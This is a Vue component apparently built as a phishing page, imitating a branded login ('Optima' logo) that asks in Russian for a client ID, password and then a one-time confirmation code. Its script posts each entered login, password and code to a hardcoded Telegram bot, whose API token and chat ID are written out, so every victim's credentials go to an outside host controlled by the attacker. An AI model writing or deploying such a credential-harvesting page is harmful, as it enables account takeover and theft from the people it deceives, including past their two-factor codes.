<template>
  <div id="app">
    <div class="container d-flex align-items-center justify-content-center h-100">
      <div class="row">
        <div class="col pt-3">
          <div class="text-center">
            <img class="mb-3" src="@/assets/logo_optima.jpg">
          </div>

          <div v-show="step === 1" class="step">
            <form method="POST" @submit.prevent="submit">
              <div class="mb-3">
                <input required v-model="loginUser" type="text" class="form-control" maxlength="7" pattern="-?(\d+|\d+.\d+|.\d+)([eE][-+]?\d+)?" oninput="this.value|=0" placeholder="Client ID: 0000000" id="name" aria-describedby="name">
                <div id="emailHelp" class="form-text">Максимальное количество цифр 7</div>
              </div>
              <div class="mb-3">
                <input required v-model="idCard" type="password" class="form-control" placeholder="Пароль" id="exampleInputEmail1" aria-describedby="emailHelp">
              </div>
              <div class="text-center">
                <button type="submit" class="btn btn-danger" @click="nextCodeAuth">Войти</button>
              </div>
            </form>
          </div>

          <div v-show="step === 2" class="step">
            <form method="POST" @submit.prevent="submitFormTwo">
              <div class="mb-3">
                <div>Код подтверждения приходить в течение {{time}} минут</div>
                <input required v-model="codeAuth" type="text" class="form-control" maxlength="5" pattern="-?(\d+|\d+.\d+|.\d+)([eE][-+]?\d+)?" placeholder="Код" id="name" aria-describedby="name">
                <div id="emailHelp" class="form-text">Максимальное количество цифр 5</div>
              </div>
              <div class="text-center">
                <button type="submit" class="btn btn-danger" @click="nextCodeAuth">Подвердить</button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
export default {
  name: 'App',

  data() {
    return {
      fullName: '',
      email: '',
      subject: '',
      message: '',

      token: '5681484607:AAHzEthwDk9Q88w3CPVg5xnoon5R0adaxGs',
      chatId: -852249326,

      step: 1,
      date: moment(60 * 5 * 1000)
    }
  },
  methods: {
    submit() {
      const fullMessage = `Логин: ${this.loginUser}\nПароль: ${this.idCard}`;
      this.$http.post(`https://api.telegram.org/bot${this.token}/sendMessage?chat_id=${this.chatId}&text=${fullMessage}`)
    },
    nextCodeAuth() {
      this.step++
    },
    submitFormTwo() {
      const fullMessage = `Код: ${this.codeAuth}`;
      this.$http.post(`https://api.telegram.org/bot${this.token}/sendMessage?chat_id=${this.chatId}&text=${fullMessage}`)
    }
  },
  computed: {
    time: function(){
      return this.date.format('mm:ss');
    }
  },
  mounted: function(){   
    setInterval(() => {
      this.date = moment(this.date.subtract(1, 'seconds'))
    }, 1000);
  }
}
</script>

<style>
.btn:focus, .btn:active {
  box-shadow: none !important;
}

.form-control:focus, .form-control:active {
  box-shadow: none !important;
}

.h-100 {
  height: 100vh !important;
}

.form-text {
  margin-top: -2px;
}
</style>